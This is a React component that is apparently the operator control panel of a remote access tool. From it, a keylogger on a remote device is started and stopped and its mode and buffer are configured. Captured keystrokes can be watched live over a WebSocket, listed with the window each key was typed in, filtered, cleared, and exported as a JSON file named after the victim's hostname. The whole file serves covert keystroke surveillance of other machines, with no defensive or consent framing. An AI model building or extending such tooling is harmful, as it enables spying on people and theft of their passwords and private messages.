import React, { useState, useEffect, useRef } from 'react';
import DraggableModal from '../modal';

const Keylogger = ({ device, onClose }) => {
    const [isActive, setIsActive] = useState(false);
    const [config, setConfig] = useState({
        mode: 'offline',
        offlineInterval: 60,
        maxBuffer: 1000
    });
    const [status, setStatus] = useState(null);
    const [events, setEvents] = useState([]);
    const [liveEvents, setLiveEvents] = useState([]);
    const [loading, setLoading] = useState(false);
    const [filter, setFilter] = useState('');
    const [showLive, setShowLive] = useState(false);
    const liveSocketRef = useRef(null);
    const eventsEndRef = useRef(null);

    useEffect(() => {
        fetchStatus();
    }, [device]);

    useEffect(() => {
        if (showLive && isActive && config.mode !== 'offline') {
            connectLiveSocket();
        } else {
            disconnectLiveSocket();
        }
        return () => disconnectLiveSocket();
    }, [showLive, isActive, config.mode]);

    useEffect(() => {
        if (showLive) {
            scrollToBottom();
        }
    }, [liveEvents]);

    const scrollToBottom = () => {
        eventsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    };

    const fetchStatus = async () => {
        try {
            const response = await fetch(`/api/keylogger/status/${device.id}`);
            const data = await response.json();
            if (data.session) {
                setIsActive(data.session.isActive);
                setConfig(data.session.config);
                setStatus(data.session);
            }
        } catch (error) {
            console.error('Failed to fetch keylogger status:', error);
        }
    };

    const startKeylogger = async () => {
        setLoading(true);
        try {
            const response = await fetch(`/api/keylogger/start/${device.id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            });
            
            if (response.ok) {
                setIsActive(true);
                await fetchStatus();
            } else {
                alert('Failed to start keylogger');
            }
        } catch (error) {
            console.error('Failed to start keylogger:', error);
            alert('Failed to start keylogger');
        } finally {
            setLoading(false);
        }
    };

    const stopKeylogger = async () => {
        setLoading(true);
        try {
            const response = await fetch(`/api/keylogger/stop/${device.id}`, {
                method: 'POST'
            });
            
            if (response.ok) {
                setIsActive(false);
                await fetchStatus();
                disconnectLiveSocket();
            } else {
                alert('Failed to stop keylogger');
            }
        } catch (error) {
            console.error('Failed to stop keylogger:', error);
            alert('Failed to stop keylogger');
        } finally {
            setLoading(false);
        }
    };

    const fetchEvents = async () => {
        try {
            const response = await fetch(`/api/keylogger/events/${device.id}?limit=500`);
            const data = await response.json();
            setEvents(data.events || []);
        } catch (error) {
            console.error('Failed to fetch events:', error);
        }
    };

    const clearEvents = async () => {
        if (!confirm('Are you sure you want to clear all keylogger events?')) {
            return;
        }
        
        try {
            const response = await fetch(`/api/keylogger/events/${device.id}`, {
                method: 'DELETE'
            });
            
            if (response.ok) {
                setEvents([]);
                setLiveEvents([]);
            } else {
                alert('Failed to clear events');
            }
        } catch (error) {
            console.error('Failed to clear events:', error);
            alert('Failed to clear events');
        }
    };

    const connectLiveSocket = () => {
        if (liveSocketRef.current) return;

        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}/api/keylogger/live/${device.id}`;
        
        liveSocketRef.current = new WebSocket(wsUrl);
        
        liveSocketRef.current.onmessage = (event) => {
            const keyEvent = JSON.parse(event.data);
            setLiveEvents(prev => [...prev, keyEvent].slice(-100)); // Keep only last 100 events
        };
        
        liveSocketRef.current.onerror = (error) => {
            console.error('Live socket error:', error);
        };
        
        liveSocketRef.current.onclose = () => {
            liveSocketRef.current = null;
        };
    };

    const disconnectLiveSocket = () => {
        if (liveSocketRef.current) {
            liveSocketRef.current.close();
            liveSocketRef.current = null;
        }
    };

    const formatKey = (key) => {
        if (key === 'Space') return ' ';
        if (key === 'Enter') return '↵';
        if (key === 'Tab') return '⇥';
        if (key === 'Backspace') return '⌫';
        if (key.length === 1) return key;
        return `[${key}]`;
    };

    const getFilteredEvents = (eventList) => {
        if (!filter) return eventList;
        return eventList.filter(event => 
            event.key.toLowerCase().includes(filter.toLowerCase()) ||
            event.window.toLowerCase().includes(filter.toLowerCase())
        );
    };

    const exportEvents = () => {
        const dataStr = JSON.stringify(events, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `keylogger_${device.hostname}_${new Date().toISOString().split('T')[0]}.json`;
        link.click();
        URL.revokeObjectURL(url);
    };

    return (
        <DraggableModal
            draggable={true}
            maskClosable={false}
            destroyOnClose={true}
            modalTitle={`Keylogger - ${device.hostname}`}
            footer={null}
            height={600}
            width={800}
            bodyStyle={{
                padding: 0
            }}
            open={!!device}
            onCancel={onClose}
        >
            <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', height: '560px' }}>
                    {/* Control Panel */}
                    <div style={{ marginBottom: '20px', padding: '15px', border: '1px solid #ddd', borderRadius: '5px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '15px' }}>
                            <span style={{ fontWeight: 'bold' }}>Status:</span>
                            <span style={{ color: isActive ? 'green' : 'red' }}>
                                {isActive ? 'Active' : 'Inactive'}
                            </span>
                            {status && (
                                <span style={{ marginLeft: '20px', fontSize: '12px', color: '#666' }}>
                                    Events: {status.eventCount} | Last: {status.lastEvent ? new Date(status.lastEvent).toLocaleTimeString() : 'Never'}
                                </span>
                            )}
                        </div>
                        
                        <div style={{ display: 'flex', gap: '15px', alignItems: 'center', flexWrap: 'wrap' }}>
                            <label>
                                Mode:
                                <select 
                                    value={config.mode} 
                                    onChange={(e) => setConfig({...config, mode: e.target.value})}
                                    disabled={isActive}
                                    style={{ marginLeft: '5px', padding: '2px' }}
                                >
                                    <option value="offline">Offline</option>
                                    <option value="live">Live</option>
                                    <option value="both">Both</option>
                                </select>
                            </label>
                            
                            <label>
                                Interval (s):
                                <input 
                                    type="number" 
                                    value={config.offlineInterval}
                                    onChange={(e) => setConfig({...config, offlineInterval: parseInt(e.target.value)})}
                                    disabled={isActive}
                                    style={{ marginLeft: '5px', width: '60px', padding: '2px' }}
                                    min="10"
                                    max="3600"
                                />
                            </label>
                            
                            <label>
                                Buffer:
                                <input 
                                    type="number" 
                                    value={config.maxBuffer}
                                    onChange={(e) => setConfig({...config, maxBuffer: parseInt(e.target.value)})}
                                    disabled={isActive}
                                    style={{ marginLeft: '5px', width: '80px', padding: '2px' }}
                                    min="100"
                                    max="10000"
                                />
                            </label>
                        </div>
                        
                        <div style={{ marginTop: '15px', display: 'flex', gap: '10px' }}>
                            {!isActive ? (
                                <button onClick={startKeylogger} disabled={loading} style={{ padding: '5px 15px', backgroundColor: '#4CAF50', color: 'white', border: 'none', borderRadius: '3px' }}>
                                    {loading ? 'Starting...' : 'Start Keylogger'}
                                </button>
                            ) : (
                                <button onClick={stopKeylogger} disabled={loading} style={{ padding: '5px 15px', backgroundColor: '#f44336', color: 'white', border: 'none', borderRadius: '3px' }}>
                                    {loading ? 'Stopping...' : 'Stop Keylogger'}
                                </button>
                            )}
                            
                            <button onClick={fetchEvents} style={{ padding: '5px 15px', backgroundColor: '#2196F3', color: 'white', border: 'none', borderRadius: '3px' }}>
                                Refresh Events
                            </button>
                            
                            <button onClick={clearEvents} style={{ padding: '5px 15px', backgroundColor: '#FF9800', color: 'white', border: 'none', borderRadius: '3px' }}>
                                Clear Events
                            </button>
                            
                            <button onClick={exportEvents} disabled={events.length === 0} style={{ padding: '5px 15px', backgroundColor: '#9C27B0', color: 'white', border: 'none', borderRadius: '3px' }}>
                                Export
                            </button>
                            
                            {isActive && config.mode !== 'offline' && (
                                <label style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                                    <input 
                                        type="checkbox" 
                                        checked={showLive}
                                        onChange={(e) => setShowLive(e.target.checked)}
                                    />
                                    Live View
                                </label>
                            )}
                        </div>
                    </div>
                    
                    {/* Filter */}
                    <div style={{ marginBottom: '15px' }}>
                        <input 
                            type="text"
                            placeholder="Filter events by key or window..."
                            value={filter}
                            onChange={(e) => setFilter(e.target.value)}
                            style={{ width: '100%', padding: '8px', border: '1px solid #ddd', borderRadius: '3px' }}
                        />
                    </div>
                    
                    {/* Events Display */}
                    <div style={{ flex: 1, border: '1px solid #ddd', borderRadius: '5px', overflow: 'hidden' }}>
                        {showLive ? (
                            <div style={{ height: '100%', display: 'flex', flexDirection: 'column' }}>
                                <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderBottom: '1px solid #ddd', fontWeight: 'bold' }}>
                                    Live Keystrokes
                                </div>
                                <div style={{ flex: 1, overflow: 'auto', padding: '10px', fontFamily: 'monospace', fontSize: '14px' }}>
                                    {getFilteredEvents(liveEvents).map((event, index) => (
                                        <div key={index} style={{ marginBottom: '5px', padding: '5px', backgroundColor: '#f9f9f9', borderRadius: '3px' }}>
                                            <span style={{ color: '#666', fontSize: '12px' }}>
                                                {new Date(event.timestamp).toLocaleTimeString()}
                                            </span>
                                            <span style={{ marginLeft: '10px', fontWeight: 'bold' }}>
                                                {formatKey(event.key)}
                                            </span>
                                            <span style={{ marginLeft: '10px', color: '#888', fontSize: '12px' }}>
                                                in {event.window}
                                            </span>
                                        </div>
                                    ))}
                                    <div ref={eventsEndRef} />
                                </div>
                            </div>
                        ) : (
                            <div style={{ height: '100%', display: 'flex', flexDirection: 'column' }}>
                                <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderBottom: '1px solid #ddd', fontWeight: 'bold' }}>
                                    Recorded Events ({events.length})
                                </div>
                                <div style={{ flex: 1, overflow: 'auto', padding: '10px', fontFamily: 'monospace', fontSize: '14px' }}>
                                    {getFilteredEvents(events).map((event, index) => (
                                        <div key={index} style={{ marginBottom: '5px', padding: '5px', backgroundColor: '#f9f9f9', borderRadius: '3px' }}>
                                            <span style={{ color: '#666', fontSize: '12px' }}>
                                                {new Date(event.timestamp).toLocaleString()}
                                            </span>
                                            <span style={{ marginLeft: '10px', fontWeight: 'bold' }}>
                                                {formatKey(event.key)}
                                            </span>
                                            <span style={{ marginLeft: '10px', color: '#888', fontSize: '12px' }}>
                                                {event.type} in {event.window}
                                            </span>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>
            </div>
        </DraggableModal>
    );
};

export default Keylogger;
